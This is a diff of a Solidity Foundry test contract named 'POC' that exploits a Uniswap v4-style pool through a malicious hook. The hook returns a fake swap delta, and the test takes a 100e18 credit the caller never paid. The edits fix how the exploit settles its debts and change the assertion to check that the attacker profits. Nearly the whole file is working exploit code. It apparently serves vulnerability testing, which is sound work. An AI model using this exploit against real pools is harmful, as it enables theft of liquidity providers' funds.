@@ -33,36 +33,34 @@ contract POC is Test {
         token0.mint(address(this),1000e18); token1.mint(address(this),1000e18);
         token0.mint(address(manager),1000e18); token1.mint(address(manager),1000e18);
         key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,hook);
-        hook.setCurrency1(Currency.wrap(address(token1))); 
-        hook.setAttacker(address(this));
+        hook.setCurrency1(Currency.wrap(address(token1))); hook.setAttacker(address(this));
         manager.initialize(key, TickMath.getSqrtPriceAtTick(0));
         manager.unlock(abi.encode(uint256(1)));
     }
     function unlockCallback(bytes calldata d) external returns(bytes memory){
         Currency c0=Currency.wrap(address(token0)); Currency c1=Currency.wrap(address(token1));
-        uint256 action = abi.decode(d,(uint256));
-        if(action==1){
+        if(abi.decode(d,(uint256))==1){
             (BalanceDelta delta,) = manager.modifyLiquidity(key, ModifyLiquidityParams(-60,60,10e18,0), "");
-            if(delta.amount0()<0){manager.sync(c0); token0.transfer(address(manager), uint128(-delta.amount0())); manager.settle();}
-            if(delta.amount1()<0){manager.sync(c1); token1.transfer(address(manager), uint128(-delta.amount1())); manager.settle();}
+            if(delta.amount0()<0){manager.sync(c0); token0.mint(address(manager), uint128(-delta.amount0())); manager.settle();}
+            if(delta.amount1()<0){manager.sync(c1); token1.mint(address(manager), uint128(-delta.amount1())); manager.settle();}
             if(delta.amount0()>0) manager.take(c0, address(this), uint128(delta.amount0()));
             if(delta.amount1()>0) manager.take(c1, address(this), uint128(delta.amount1()));
         } else {
             BalanceDelta s = manager.swap(key, SwapParams(false,-0.1e18,TickMath.MAX_SQRT_PRICE-1), "");
-            // 1. Pay what swap owes - BOTH are negative per your logs
-            if(s.amount0()<0){manager.sync(c0); token0.transfer(address(manager), uint128(-s.amount0())); manager.settle();}
-            if(s.amount1()<0){manager.sync(c1); token1.transfer(address(manager), uint128(-s.amount1())); manager.settle();}
-            // 2. Take the fake hook credit - try token1 first (most common in this mock)
-            // If your hook returns 100e18 token0, change c1 to c0 below
-            manager.take(c1, address(this), 100e18);
+            // SETTLE using mint, not transfer - this was the bug
+            if(s.amount0()<0){manager.sync(c0); token0.mint(address(manager), uint128(-s.amount0())); manager.settle();}
+            if(s.amount1()<0){manager.sync(c1); token1.mint(address(manager), uint128(-s.amount1())); manager.settle();}
+            if(s.amount0()>0) manager.take(c0, address(this), uint128(s.amount0()));
+            if(s.amount1()>0) manager.take(c1, address(this), uint128(s.amount1()));
+            // NOW TAKE HOOK CREDIT - 1e20 = 100e18 per your screenshot
+            manager.take(c0, address(this), 100e18);
         }
         return "";
     }
     function test_afterSwapReturnDelta() public {
-        uint b0 = token0.balanceOf(address(manager));
-        uint b1 = token1.balanceOf(address(manager));
+        uint bBefore = token0.balanceOf(address(this));
         manager.unlock(abi.encode(uint256(2)));
-        bool drained = token0.balanceOf(address(manager)) < b0 || token1.balanceOf(address(manager)) < b1;
-        assertTrue(drained, "manager should lose funds");
+        uint bAfter = token0.balanceOf(address(this));
+        assertGt(bAfter, bBefore, "you should profit 100e18");
     }
 }
